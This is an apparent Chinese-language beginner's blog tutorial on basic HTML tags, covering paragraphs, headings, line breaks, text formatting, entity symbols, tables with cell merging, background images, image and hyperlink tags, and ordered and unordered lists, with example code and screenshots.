<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果加上段落标记&lt;p&gt;&lt;&#x2F;p&gt;</span><br><span class="line">在加入&lt;p&gt;&lt;&#x2F;p&gt;变成了一个段落</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;herd&gt;</span><br><span class="line">		&lt;title&gt;HTML的基本标签&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---段落标记---&gt;</span><br><span class="line">		&lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt;</span><br><span class="line">		&lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt;</span><br><span class="line">		&lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt;</span><br><span class="line">		Document，英语单词，名词、动词，作名词时译为“文件，公文；[计] 文档；证件”，作动词时译为“用文件证明”。</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410090449110.png" alt="image-20200410090449110"></p>
<h5 id="标题字"><a href="#标题字" class="headerlink" title="标题字"></a>标题字</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标题字：是HTML预留的格式，和word的标题字相同</span><br><span class="line">标题字的标签是：</span><br><span class="line">	&lt;h1&gt;&lt;&#x2F;h1&gt;到&lt;h6&gt;&lt;&#x2F;h6&gt;</span><br><span class="line">		依次字体越来越小，h1字体最大，h6字体最小</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410090519967.png" alt="image-20200410090519967"></p>
<h5 id="换行标签"><a href="#换行标签" class="headerlink" title="换行标签"></a>换行标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果只是回车来进行文字换行的话，是不会换行的，需要使用标签来进行换行</span><br><span class="line">HTML中的换行标签是&lt;br&gt;</span><br><span class="line">&lt;br&gt;标签是一个独目标签，没有&lt;&#x2F;br&gt;这种结束标签，也不能使用&lt;&#x2F;br&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410091058239.png" alt="image-20200410091058239"></p>
<h5 id="水平线标签"><a href="#水平线标签" class="headerlink" title="水平线标签"></a>水平线标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">水平线标记和换行标记都是独目标记，都没有&lt;&#x2F;..&gt;来结束</span><br><span class="line">水平线的标签是&lt;hr&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410091727081.png" alt="image-20200410091727081"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在hr底下好可以加其他的东西，比如颜色，宽度</span><br><span class="line">&lt;hr color&#x3D;&quot;blue&quot; width&#x3D;&quot;50%&quot;&gt;</span><br><span class="line">这里选择了蓝色，宽度为50%</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410100133700.png" alt="image-20200410100133700"></p>
<h5 id="预留格式标签"><a href="#预留格式标签" class="headerlink" title="预留格式标签"></a>预留格式标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">预留格式标签就是在这个标签中，你输入的是什么格式就是什么格式，比如换行就不需要加&lt;br&gt;标签进行换行了。</span><br><span class="line">预留标签：</span><br><span class="line">	&lt;pre&gt;内容&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410101126424.png" alt="image-20200410101126424"></p>
<h5 id="删除字，插入字，粗体字，斜体字"><a href="#删除字，插入字，粗体字，斜体字" class="headerlink" title="删除字，插入字，粗体字，斜体字"></a>删除字，插入字，粗体字，斜体字</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;del&gt;删除字&lt;&#x2F;del&gt;</span><br><span class="line">&lt;ins&gt;插入字&lt;&#x2F;ins&gt;</span><br><span class="line">&lt;b&gt;粗体字&lt;&#x2F;b&gt;</span><br><span class="line">&lt;i&gt;斜体字&lt;&#x2F;i&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410101617474.png" alt="image-20200410101617474"></p>
<h5 id="右上角和右下角加字"><a href="#右上角和右下角加字" class="headerlink" title="右上角和右下角加字"></a>右上角和右下角加字</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10的平方，2出现在右上角</span><br><span class="line">10&lt;sup&gt;2&lt;&#x2F;sup&gt;</span><br><span class="line">出现在右下角</span><br><span class="line">10的m</span><br><span class="line">10&lt;sub&gt;m&lt;&#x2F;sub&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410102011107.png" alt="image-20200410102011107"></p>
<h5 id="字体标签"><a href="#字体标签" class="headerlink" title="字体标签"></a>字体标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font&gt;字体标签&lt;&#x2F;font&gt;</span><br><span class="line">在这个标签中可以设置颜色，大小等等</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410102325382.png" alt="image-20200410102325382"></p>
<h4 id="实体符号"><a href="#实体符号" class="headerlink" title="实体符号"></a>实体符号</h4><h5 id="空格，大于号，小于号"><a href="#空格，大于号，小于号" class="headerlink" title="空格，大于号，小于号"></a>空格，大于号，小于号</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;lt就是小于&amp;gt就是大于</span><br><span class="line">如果是b&lt;a&gt;c，如果这样输入的话，&lt;a&gt;是超链接标签，在执行时候会被当做标签隐藏，得到的结果就是bc</span><br><span class="line">实体符号特点是：以&amp;开始，以;结束。</span><br><span class="line">b&lt;a&gt;c</span><br><span class="line">空格&amp;nbsp。</span><br><span class="line">		如果要加空格直接使用键盘上的空格键是不行的，只能空一个格只有使用&amp;nbsp;才能加空格</span><br><span class="line">例如:12如果要用空格隔开</span><br><span class="line">要加几个空格就要加几个&amp;nbsp</span><br><span class="line">		1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410104135650.png" alt="image-20200410104135650"></p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这些标签并不是独目标签</span><br><span class="line">表格用标签&lt;table&gt;&lt;&#x2F;tbale&gt;</span><br><span class="line">表格中要有行标签是&lt;tr&gt;，一个tr就代表一行</span><br><span class="line">行中要有格，格用&lt;td&gt;表示</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以在&lt;table&gt;标签中添加border、width、height</span><br><span class="line">border&#x3D;&quot;1&quot;	设置表格的边框为1像素宽度</span><br><span class="line">width 	宽度	后面单位可以使用%或者px,推荐使用%</span><br><span class="line">height 	高度	后面单位可以使用%或者px,推荐使用%</span><br><span class="line">使用width设置边框的宽度为300像数，也可以使用%比如：</span><br><span class="line">    &lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;30%&quot; height&#x3D;&quot;20%&quot;&gt;		</span><br><span class="line">    设置%百分比的好处就是，你的窗口变大他也跟着变大，窗口变小也跟着变小。</span><br><span class="line">    %百分比的意思就是，例如：50%就是占这个窗口的%50随着窗口的大小进行自我调节</span><br><span class="line"></span><br><span class="line">这个align属性可以加在&lt;tr&gt;中&lt;td&gt;中，这样将align的值设置为center这样就可以将内容居中</span><br><span class="line">相同left就是左对齐，right就是右对齐</span><br><span class="line">如果将align加在&lt;table&gt;标签中，可以使表格居中然是内容不居中(内容不居中的前提是没有在&lt;tr&gt;和&lt;td&gt;中加入align)</span><br><span class="line"></span><br><span class="line">align对齐方式</span><br><span class="line">&lt;tr align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;td&gt;1&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410111834044.png" alt="image-20200410111834044"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以使用br进行换行，然后加入&lt;h2&gt;标题标签，然后再加入一个水平线标签</span><br><span class="line">加入align&#x3D;&quot;center&quot;来进行居中</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410112328588.png" alt="image-20200410112328588"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">也可以不用属性，直接使用center标签&lt;center&gt;&lt;&#x2F;center&gt;</span><br><span class="line">例如：</span><br><span class="line">	&lt;center&gt;&lt;h2&gt;企业规划&lt;&#x2F;h2&gt;&lt;center&#x2F;&gt;</span><br><span class="line">效果都是一样的，自行选择</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410112736375.png" alt="image-20200410112736375"></p>
<h4 id="表-单元格合成"><a href="#表-单元格合成" class="headerlink" title="表-单元格合成"></a>表-单元格合成</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用rowspan进行单元格合并</span><br><span class="line">例如：查看原始界面</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410131902654.png" alt="image-20200410131902654"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rowspan是行合并，如果要列合并的话是colspan</span><br><span class="line">使用rowspan属性进行合并，用6将9合并</span><br><span class="line">合并的时候必须将其中一个&lt;td&gt;标签删除</span><br><span class="line">注意：使用rowspan删除标签的时候只能删除下方的单元格</span><br><span class="line">		而colspan删除任何一个都行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">	&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;表格合并&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;30%&quot; height&#x3D;&quot;20%&quot;&gt;</span><br><span class="line">			&lt;tr&gt;</span><br><span class="line">				&lt;td&gt;1&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;td&gt;2&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;td&gt;3&lt;&#x2F;td&gt;</span><br><span class="line">			&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;tr&gt;</span><br><span class="line">				&lt;td&gt;4&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;td&gt;5&lt;&#x2F;td&gt;</span><br><span class="line">			&lt;!---在6的位置加上rowspan进行合并，删除或者注释掉9。---&gt;</span><br><span class="line">				&lt;td rowspan&#x3D;&quot;2&quot;&gt;6&lt;&#x2F;td&gt;</span><br><span class="line">			&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;tr&gt;</span><br><span class="line">				&lt;td&gt;7&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;td&gt;8&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;!---&lt;td&gt;9&lt;&#x2F;td&gt;---&gt;</span><br><span class="line">			&lt;&#x2F;tr&gt;</span><br><span class="line">		&lt;&#x2F;table&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>查看页面返回，6将9的单元格合并了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410132244611.png" alt="image-20200410132244611"></p>
<p>如果删除单元格而不加rowspan属性，页面返回，一个有问题的页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410132525064.png" alt="image-20200410132525064"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用列合并属性colspan进行列合并</span><br><span class="line">使用方法和rowspan属性一样，删除一个值进行合并</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410133220112.png" alt="image-20200410133220112"></p>
<h5 id="th标签"><a href="#th标签" class="headerlink" title="th标签"></a>th标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">th标签也是单元格标签，比td多的是加粗和居中</span><br><span class="line">首先查看td标签返回的结果</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410134108234.png" alt="image-20200410134108234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在查看th标签返回的结果，自动加粗居中</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410134241485.png" alt="image-20200410134241485"></p>
<h4 id="表格thead-tbody-tfoot"><a href="#表格thead-tbody-tfoot" class="headerlink" title="表格thead tbody tfoot"></a>表格thead tbody tfoot</h4><p>thead tbody tfoot这三个其实就是讲代码table中的代码分组，为了后期操作简单，后期操作只需要一个组一个组得来进行修改。在没什么区别</p>
<p>注意：虽然没区别，但如果用了合并单元格的属性例如rowspan属性将两个地方使用这三个中其中一个进行分组分开了，就有可能出现问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;thead tbody tfoot 在table中不是必须的，只是这样做便于后期JS代码编写&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;20%&quot;&gt;</span><br><span class="line">			&lt;!---头---&gt;</span><br><span class="line">			&lt;thead&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;员工部门&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;员工编号&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;员工工资&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;&#x2F;thead&gt;</span><br><span class="line">			&lt;!---体---&gt;</span><br><span class="line">			&lt;body&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;1&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;2&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;3&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;&#x2F;body&gt;</span><br><span class="line">			&lt;!---脚---&gt;</span><br><span class="line">			&lt;tfoot&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;4&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;5&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;td&gt;6&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;&#x2F;tfoot&gt;</span><br><span class="line">			</span><br><span class="line">		&lt;&#x2F;table&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="设置背景颜色和图片"><a href="#设置背景颜色和图片" class="headerlink" title="设置背景颜色和图片"></a>设置背景颜色和图片</h4><p>设置背景颜色在body里面加入属性bgcolor=”颜色”来设置背景颜色</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;!---这行代码的作用是告诉浏览器采用哪一种字符集打开当前页面</span><br><span class="line">		注意：并不是设置当前页面的字符编码方式---&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;背景颜色和背景图片&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;!---bgcolor用来设置背景颜色---&gt;</span><br><span class="line">	&lt;body bgcolor&#x3D;&quot;aqua&quot;&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">这里设置了背景颜色aqua</span><br><span class="line">查看页面</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410142234930.png" alt="image-20200410142234930"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置图片背景图片</span><br><span class="line">使用属性background来设置网页的背景图片，如果图片不够大将重叠，将其铺满</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;!---这行代码的作用是告诉浏览器采用哪一种字符集打开当前页面</span><br><span class="line">		注意：并不是设置当前页面的字符编码方式---&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;背景颜色和背景图片&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;!---bgcolor用来设置背景颜色</span><br><span class="line">	background设置背景图片的</span><br><span class="line">	当设置背景图片后，背景色就看不到了，背景色在背景图片下面</span><br><span class="line">	---&gt;</span><br><span class="line">	&lt;body bgcolor&#x3D;&quot;aqua&quot; background&#x3D;&quot;picture&#x2F;picture.gif&quot;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410143021170.png" alt="image-20200410143021170"></p>
<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			1、设置图片的宽度和高度的时候，只设置宽度，高度会进行等比例缩放</span><br><span class="line">			2、&lt;img&gt;标签就是图片标签</span><br><span class="line">			3、src属性是图片的路径</span><br><span class="line">			4、width设置宽度</span><br><span class="line">			5、height设置高度</span><br><span class="line">			6、title属性是设置鼠标悬停时，图片的信息</span><br><span class="line">			7、alt设置图片加载失败时，显示的提示信息</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;img src&#x3D;&quot;image&#x2F;CCcat.jpg&quot; width&#x3D;&quot;210px&quot; title&#x3D;&quot;我是CC猫&quot; alt&#x3D;&quot;图片找不到了&quot;&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">我们上面写得&lt;img&gt;&lt;&#x2F;img&gt;正确个是应该是这样的，为什么没有写结束标签呢？</span><br><span class="line">因为有一种情况就是&lt;img&gt;中间什么也不写&lt;&#x2F;img&gt;直接将结束标签删除，在头部分加一个反斜杠&lt;img &#x2F;&gt;</span><br><span class="line">查看能找到图片和找不到图片的网页</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410144646313.png" alt="image-20200410144646313"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410144657935.png" alt="image-20200410144657935"></p>
<h4 id="超链接或者热链接"><a href="#超链接或者热链接" class="headerlink" title="超链接或者热链接"></a>超链接或者热链接</h4><h5 id="文字超链接"><a href="#文字超链接" class="headerlink" title="文字超链接"></a>文字超链接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;超链接或者热链接&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			超链接就是a标签开始a标签结束</span><br><span class="line">			标签中有href属性属性后面跟URL</span><br><span class="line">			超链接有一个特点就是讲鼠标放在超链接上会变成小手标记</span><br><span class="line">			并且超链接会有下划线。</span><br><span class="line">			当你点了给超链接的命名后就会发送请求给服务器，跳转到超链接地址</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			href:hot references 	热引用</span><br><span class="line">			href属性后面一定是一个资源的地址</span><br><span class="line">			href后面的跟资源地址可以使网络上的url也可以是本地的路径</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;zhanqiaozai.github.io&quot;&gt;博客&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;a&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">查看界面并点击跳转</span><br></pre></td></tr></table></figure>

<h5 id="图片超链接"><a href="#图片超链接" class="headerlink" title="图片超链接"></a>图片超链接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;超链接或者热链接&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			超链接就是a标签开始a标签结束</span><br><span class="line">			标签中有href属性属性后面跟URL</span><br><span class="line">			超链接有一个特点就是讲鼠标放在超链接上会变成小手标记</span><br><span class="line">			并且超链接会有下划线。</span><br><span class="line">			当你点了给超链接的命名后就会发送请求给服务器，跳转到超链接地址</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			href:hot references 	热引用</span><br><span class="line">			href属性后面一定是一个资源的地址</span><br><span class="line">			href后面的跟资源地址可以使网络上的url也可以是本地的路径</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;zhanqiaozai.github.io&quot;&gt;博客&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			图片超链接</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.hao123.com&quot;&gt;</span><br><span class="line">			&lt;img src&#x3D;&quot;image&#x2F;hao123.png&quot; width&#x3D;&quot;100px&quot; title&#x3D;&quot;hao123浏览器&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			超链接有一个target属性</span><br><span class="line">				可取值：</span><br><span class="line">					_blank  ：	新窗口</span><br><span class="line">					_self   ：	当前窗口（默认）</span><br><span class="line">					_top    ：	顶级窗口</span><br><span class="line">					_parent ：	父窗口</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.hao123.com&quot; target&#x3D;&quot;_blank&quot;&gt;</span><br><span class="line">			&lt;img src&#x3D;&quot;image&#x2F;hao123.png&quot; width&#x3D;&quot;100px&quot; title&#x3D;&quot;hao123浏览器&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;a&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">新窗口和当前窗口区别</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410153350123.png" alt="image-20200410153350123"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410153422391.png" alt="image-20200410153422391"></p>
<h4 id="超链接的作用request，response"><a href="#超链接的作用request，response" class="headerlink" title="超链接的作用request，response"></a>超链接的作用request，response</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!---</span><br><span class="line">	超链接的作用：</span><br><span class="line">		通过超链接可以从浏览器向服务器发送请求</span><br><span class="line">		浏览器向服务器发送数据（请求：request）</span><br><span class="line">		服务器向浏览器发送数据（响应：response）</span><br><span class="line">		</span><br><span class="line">		B&#x2F;S结构的系统，每一个请求都会对应一个响应。</span><br><span class="line">		B-----》-----S 	 请求</span><br><span class="line">		S-----》-----B 	 响应</span><br><span class="line">	用户在点击超链接和用户在浏览器低智商直接输入URL有什么区别?</span><br><span class="line">		本质上没有区别，都是向服务器发送请求</span><br><span class="line">		硬要说区别就是</span><br><span class="line">			超链接傻瓜式，不需要记地址，只要会点就行</span><br><span class="line">			而用户输入地址的话就得记地址。</span><br><span class="line">	从操作上来讲超链接使用更方便</span><br><span class="line">---&gt;</span><br></pre></td></tr></table></figure>

<h4 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;HTML列表&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---有序列表---&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!---</span><br><span class="line">			有序列表就是有序号的</span><br><span class="line">			例如:1 2 3</span><br><span class="line">		---&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;ol&gt;</span><br><span class="line">			&lt;li&gt;水蜜桃</span><br><span class="line">				&lt;ol&gt;</span><br><span class="line">					&lt;li&gt;苹果&lt;&#x2F;li&gt;</span><br><span class="line">					&lt;li&gt;讷鱼&lt;&#x2F;li&gt;</span><br><span class="line">					&lt;li&gt;手牛弹&lt;&#x2F;li&gt;</span><br><span class="line">				&lt;&#x2F;ol&gt;</span><br><span class="line">			&lt;&#x2F;li&gt;</span><br><span class="line">			&lt;li&gt;大波诺&lt;&#x2F;li&gt;</span><br><span class="line">			&lt;li&gt;大西瓜&lt;&#x2F;li&gt;</span><br><span class="line">		&lt;&#x2F;ol&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!---无序列表---&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!---</span><br><span class="line">			无序列表就是没有1 2 3</span><br><span class="line">			只是用点来表示</span><br><span class="line">		---&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;ul type&#x3D;&quot;disc&quot;&gt;</span><br><span class="line">			&lt;li&gt;China</span><br><span class="line">				&lt;ul type&#x3D;&quot;circle&quot;&gt;</span><br><span class="line">					&lt;li&gt;山东</span><br><span class="line">						&lt;ul&gt;</span><br><span class="line">							&lt;li&gt;青岛&lt;&#x2F;li&gt;</span><br><span class="line">						&lt;&#x2F;ul&gt;</span><br><span class="line">					&lt;&#x2F;li&gt;</span><br><span class="line">					&lt;li&gt;上海&lt;&#x2F;li&gt;</span><br><span class="line">				&lt;&#x2F;ul&gt;</span><br><span class="line">			&lt;&#x2F;li&gt;</span><br><span class="line">			&lt;li&gt;Italian&lt;&#x2F;li&gt;</span><br><span class="line">			&lt;li&gt;French&lt;&#x2F;li&gt;</span><br><span class="line">		&lt;&#x2F;ul&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410161856832.png" alt="image-20200410161856832"></p>
